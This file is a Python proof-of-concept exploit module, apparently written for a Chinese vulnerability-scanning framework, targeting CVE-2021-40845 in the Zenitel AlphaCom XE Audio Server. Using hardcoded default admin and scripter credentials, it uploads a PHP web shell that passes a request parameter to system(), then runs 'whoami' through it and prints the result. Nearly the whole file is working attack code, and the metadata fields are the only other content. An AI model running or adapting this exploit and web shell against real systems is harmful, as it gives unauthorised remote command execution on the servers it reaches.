from datetime import date
from BasePoc import BasePoc               # 导入BasePoc，是PoC脚本实现的类中必须继承的基类
from utils import error, tree, highlight, req    # utils实现了一些常用函数，可以直接导入方便使用
from urllib.parse import urljoin
import base64
import requests
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


POC_NAME = "CVE_2021_40845_Authenticated_File_Upload_RCE"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class CVE_2021_40845_Authenticated_File_Upload_RCE(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0052',    # PoC的VID编号
            'vbid': '',
            'Name': 'CVE_2021_40845_Authenticated_File_Upload_RCE',    # PoC名称
            'Author': 'lUc1f3r11',    # PoC作者
            'Create_date': '2021-11-09',    # PoC创建时间
        },

        'vul': {
            'Product': 'Zenitel AlphaCom XE Audio Server',    # 漏洞所在产品名称
            'Version': '',    # 产品的版本号
            'Type': 'file upload RCE',    # 漏洞类型
            'Severity': 'high',    # 漏洞危害等级low/medium/high/critical
            'isWeb' : True,    # 是否Web漏洞
            'Description': '''
                Zenitel AlphaCom XE Audio Server是挪威Zenitel公司的一个混合对讲系统。该系统支持所有 VINGTOR-STENTOFON IP 和模拟对讲站。Zenitel AlphaCom XE Audio Server 11.2.3.10及之前版本存在任意文件上传漏洞。
            ''',    # 漏洞简要描述
            'DisclosureDate': '2021-9-15',    # PoC公布时间
        }
    }


    # scan_info信息可以保持默认，相关参数如target/mode/verbose在TCC框架中都可以通过命令行参数设置
    scan_info = {
        'Target': '',    # 目标网站域名
        'Mode': 'verify',    # verify或exploit
        'Verbose': True,    # 是否打印详细信息
        'Error': '',    # 检测失败时可用于记录相关信息
        'Success': False,    # 是否检出漏洞，若检出请更新该值为True
        'risk_category': 'sec_vul',
        'Ret': tree()    # 可用于记录额外的一些信息
    }

    test_case = {
        'Need_fb': False,
        'Vuln': [],    # 列表格式的测试URL
        'Not_vuln': [],    # 同上
    }

    def verify(self, first=False):
        # 漏洞验证方法（mode=verify）
        target = self.scan_info.get("Target", "")    # 获取测试目标
        verbose = self.scan_info.get("Verbose", False)   # 是否打印详细信息

        # Default credentials, change them if it is necessary
        admin_user = "admin"
        admin_pass = "alphaadmin"
        scripter_user = "scripter"
        scripter_pass = "alphascript"

        url_main =   target + "/php/index.php"
        url_upload = target + "/php/script_uploads.php"

        command = "whoami" # you can change the command you want to excecute here...
        uploaded_file = "poc.php"
        url_cmd = target + "/cmd/" + uploaded_file + "?cmd=" + command

        login_authorization =  "Basic " + str(base64.b64encode((admin_user+':'+admin_pass).encode('ascii')).decode('ascii'))
        upload_authorization = "Basic " + str(base64.b64encode((scripter_user+":"+scripter_pass).encode('ascii')).decode('ascii'))

        headers_login = {
            "Authorization": login_authorization,
            "Cache-Control": "max-age=0"
        }

        headers_upload = {
            'Authorization': upload_authorization,
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="92"',
            'sec-ch-ua-mobile': '?0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'iframe',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9',
        }

        files = {
            "userfile":(uploaded_file, "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>"),
        }

        s = requests.session()
        # Login as admin
        s.get(url_main, headers = headers_login)
        # Upload file
        upload = s.post(url_upload, files=files, headers = headers_upload)
        print("[+] shell upload status:", upload.status_code)
        # Execute command
        cmd = s.post(url_cmd)

        if cmd.status_code == 200:
            self.scan_info['Success'] = True    # 漏洞存在，必须将该字段更新为True（必须）
            self.scan_info['Ret']['VerifyInfo']['URL'] = url_cmd    # 记录漏洞相关的一些额外信息（可选）
            self.scan_info['Ret']['VerifyInfo']['DATA'] = cmd.text
            if verbose:
                highlight("[+] url: " + url_cmd + " 存在CVE-2021-40845 AlphaWeb XE Authenticated File Upload RCE漏洞！！！")
                print("[+] shell command excecute results: ", cmd.text.replace("<pre>","").replace("</pre>",""))
        else:
            if verbose:
                highlight("[+] url: " + url_cmd + " 不存在CVE-2021-40845 AlphaWeb XE Authenticated File Upload RCE漏洞！！！")

    def exploit(self, first=False):
        # 漏洞利用方法（mode=verify）
        self.verify(first=first)